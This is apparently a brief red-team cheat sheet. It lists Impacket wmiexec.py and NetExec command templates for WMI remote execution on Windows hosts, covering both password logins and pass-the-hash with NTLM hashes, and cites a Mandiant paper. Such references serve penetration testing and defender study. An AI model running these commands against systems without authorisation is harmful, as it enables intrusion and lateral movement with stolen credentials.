# Unix Shell

## 01 - Impacket

- Authenticate via impacket script with WMIExec

`$ wmiexec.py <username>:<password>@<IP> [-codecs <codec>]`

- Pass the Hash

```
$ wmiexec.py <username>@<IP> -hashes <ntlm_hash> [-codecs <codec>]

$ wmiexec.py <domain_name>/<username>@<IP> -hashes aad3b435b51404eeaa3b435b51404ee:<nt_hash> [-codecs <codec>]

$ wmiexec.py <domain_name>/<username>@<IP> -hashes :<nt_hash> [-codecs <codec>]
```

## 02 - NetExec

`$ netexec smb <IP>/<CIDR> --exec-method wmiexec -u "<username>" -p "<password>" [-d <domain_name> | --local-auth]`

- Pass the Hash

`$ netexec smb <IP>/<CIDR> --exec-method wmiexec -u "<username>" -H "<nt_hash>" [-d <domain_name> | --local-auth]`

---
## References

- [Mandiant: Windows Management Instrumentation](https://www.mandiant.com/sites/default/files/2021-09/wp-windows-management-instrumentation.pdf)